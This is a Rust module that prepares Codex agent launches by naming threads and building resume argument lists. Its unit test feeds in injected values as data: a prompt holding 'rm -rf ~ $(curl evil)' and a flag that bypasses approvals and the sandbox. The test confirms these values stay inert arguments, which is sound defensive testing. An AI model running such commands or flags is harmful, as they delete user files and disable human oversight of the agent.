//! Creates named Codex threads and prepares resume launches.

use pwf_application::{
    contract::task::session::{AgentLaunch, AgentProbe},
    ports::agent::PreparedAgentLaunch,
};
use pwf_models::session::{AgentModel, LaunchPrompt, SessionThreadTitle, SessionWorkingDirectory};

use super::{
    super::{
        ProcessEnvironment,
        codex_app_server::{CodexThreadPreparationError, start_and_name_thread_with_environment},
        codex_reasoning_effort::CodexReasoningEffort,
    },
    argv::LaunchArgv,
};

const BINARY: &str = "codex";
const THREAD_ID_PREVIEW: &str = "<thread-id returned by thread/start>";

struct CodexLaunchPlan {
    title: SessionThreadTitle,
    project_path: SessionWorkingDirectory,
    model: AgentModel,
    effort: CodexReasoningEffort,
    prompt: LaunchPrompt,
}

impl From<&AgentLaunch> for CodexLaunchPlan {
    fn from(launch: &AgentLaunch) -> Self {
        Self {
            title: launch.title.clone(),
            project_path: launch.project_path.clone(),
            model: launch.model.clone(),
            effort: launch.effort.into(),
            prompt: launch.prompt.clone(),
        }
    }
}

pub(super) fn probe(environment: &ProcessEnvironment) -> AgentProbe {
    super::probe(environment, pwf_models::session::Agent::Codex, BINARY)
}

pub(super) fn preview(launch: &AgentLaunch) -> Vec<String> {
    let plan = CodexLaunchPlan::from(launch);
    resume_argv(plan, THREAD_ID_PREVIEW.to_string())
}

pub(super) fn prepare(
    launch: &AgentLaunch,
    environment: &ProcessEnvironment,
) -> Result<PreparedAgentLaunch, CodexThreadPreparationError> {
    prepare_with_binary_and_environment(launch, BINARY, environment)
}

#[cfg(test)]
fn prepare_with_binary(
    launch: &AgentLaunch,
    app_server_binary: &str,
) -> Result<PreparedAgentLaunch, CodexThreadPreparationError> {
    prepare_with_binary_and_environment(launch, app_server_binary, &ProcessEnvironment::inherited())
}

fn prepare_with_binary_and_environment(
    launch: &AgentLaunch,
    app_server_binary: &str,
    environment: &ProcessEnvironment,
) -> Result<PreparedAgentLaunch, CodexThreadPreparationError> {
    let plan = CodexLaunchPlan::from(launch);
    let named_thread = start_and_name_thread_with_environment(
        app_server_binary,
        plan.title.as_ref(),
        plan.project_path.as_ref(),
        plan.model.as_deref(),
        plan.effort,
        environment,
    )?;
    let thread_id = named_thread.into_id();
    let arguments = resume_argv(plan, thread_id.clone());
    Ok(PreparedAgentLaunch::NamedThread {
        arguments,
        thread_id,
    })
}

fn resume_argv(plan: CodexLaunchPlan, thread_id: String) -> Vec<String> {
    let mut argv = LaunchArgv::new(BINARY).positional("resume");
    if let Some(model) = plan.model.into_inner() {
        argv = argv.flag("--model", model);
    }
    argv = argv.flag(
        "-c",
        format!("model_reasoning_effort=\"{}\"", plan.effort.as_str()),
    );
    argv.positional(thread_id)
        .into_guarded(plan.prompt.to_string())
}

#[cfg(test)]
mod tests {
    #[cfg(unix)]
    use anyhow::{Context as _, Result};
    use pwf_application::{
        contract::task::session::AgentLaunch, ports::agent::PreparedAgentLaunch,
    };
    use pwf_models::{
        session::{
            Agent, AgentModel, LaunchPrompt, SessionEffort, SessionThreadTitle,
            SessionWorkingDirectory,
        },
        task::TaskId,
    };

    use super::prepare_with_binary;
    #[cfg(unix)]
    use crate::session::codex_app_server::{AppServerFixture, OWNED_THREAD_ID};

    #[test]
    #[cfg(unix)]
    fn prepares_named_id_model_and_hostile_values_as_separate_arguments() -> Result<()> {
        let fixture = AppServerFixture::successful()?;
        let launch = AgentLaunch {
            agent: Agent::Codex,
            task_id: TaskId::try_new("PWF-0068")?,
            title: SessionThreadTitle::new("\"; thread/delete everything".to_string()),
            project_path: SessionWorkingDirectory::new("/projects".to_string()),
            prompt: LaunchPrompt::new(
                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox".to_string(),
            ),
            model: AgentModel::from(Some("gpt-8-billion".to_string())),
            effort: SessionEffort::Max,
        };

        let prepared = prepare_with_binary(
            &launch,
            fixture.binary.to_str().context("fixture path is UTF-8")?,
        )?;
        let PreparedAgentLaunch::NamedThread {
            arguments,
            thread_id,
        } = prepared
        else {
            panic!("Codex preparation must preserve its named thread")
        };

        assert_eq!(
            arguments,
            [
                "codex",
                "resume",
                "--model",
                "gpt-8-billion",
                "-c",
                "model_reasoning_effort=\"max\"",
                OWNED_THREAD_ID,
                "--",
                "; rm -rf ~ $(curl evil)\n--dangerously-bypass-approvals-and-sandbox",
            ]
        );
        assert_eq!(thread_id, OWNED_THREAD_ID);
        let requests = fixture.requests()?;
        assert_eq!(requests[2]["params"]["cwd"], "/projects");
        assert_eq!(requests[2]["params"]["model"], "gpt-8-billion");
        assert_eq!(
            requests[2]["params"]["config"]["model_reasoning_effort"],
            "max"
        );
        assert_eq!(
            requests[3]["params"]["name"],
            "\"; thread/delete everything"
        );
        Ok(())
    }
}
